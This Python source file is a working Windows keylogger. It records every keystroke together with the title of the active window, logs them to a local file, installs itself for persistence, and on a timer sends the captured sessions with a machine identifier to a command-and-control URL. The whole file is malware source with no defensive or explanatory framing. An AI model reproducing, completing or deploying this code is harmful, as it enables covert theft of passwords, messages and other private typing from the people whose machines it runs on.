import logging
import datetime
import threading
import requests
from pynput import keyboard
from pathlib import Path
from config import C2_URL, SEND_INTERVAL, MACHINE_ID
from persistence import install, is_installed
import win32gui

BASE_DIR = Path(__file__).resolve().parent
LOG_FILE = BASE_DIR / "keylog.txt"

logging.basicConfig(
    filename=LOG_FILE,
    level=logging.DEBUG,
    format="%(message)s"
)

buffer_lock     = threading.Lock()
sessions        = []     # completed window sessions waiting to be sent
current_session = None   # {"window": str, "timestamp": str, "keys": list}


def get_active_window():
    try:
        return win32gui.GetWindowText(win32gui.GetForegroundWindow())
    except Exception:
        return "Unknown"


def send_to_c2():
    while True:
        threading.Event().wait(SEND_INTERVAL)

        with buffer_lock:
            payload = list(sessions)
            sessions.clear()
            # include keys from the current (still open) window session
            if current_session and current_session["keys"]:
                payload.append({
                    "window":    current_session["window"],
                    "timestamp": current_session["timestamp"],
                    "keys":      "".join(current_session["keys"]),
                })
                current_session["keys"] = []  # sent — reset without closing the session

        if not payload:
            continue

        try:
            requests.post(C2_URL, json={
                "machine":  MACHINE_ID,
                "sessions": payload,
            }, timeout=5)
        except requests.exceptions.RequestException:
            pass  # server unreachable — drop and continue


def on_press(key):
    global current_session

    if key == keyboard.Key.esc:
        return False  # stop listener

    active = get_active_window()

    with buffer_lock:
        # window changed — finalise current session and open a new one
        if current_session is None or active != current_session["window"]:
            if current_session and current_session["keys"]:
                sessions.append({
                    "window":    current_session["window"],
                    "timestamp": current_session["timestamp"],
                    "keys":      "".join(current_session["keys"]),
                })
            ts = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            current_session = {"window": active, "timestamp": ts, "keys": []}
            logging.info(f"\n\n[{ts}] Window: {active}")

        try:
            ch = key.char
        except AttributeError:
            ch = f"[{key}]"

        logging.info(ch)
        current_session["keys"].append(ch)


def start():
    global current_session

    if not is_installed():
        install()

    # seed the first session so the buffer is never None when keys arrive
    active = get_active_window()
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    current_session = {"window": active, "timestamp": timestamp, "keys": []}

    sender = threading.Thread(target=send_to_c2, daemon=True)
    sender.start()

    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()


if __name__ == "__main__":
    start()
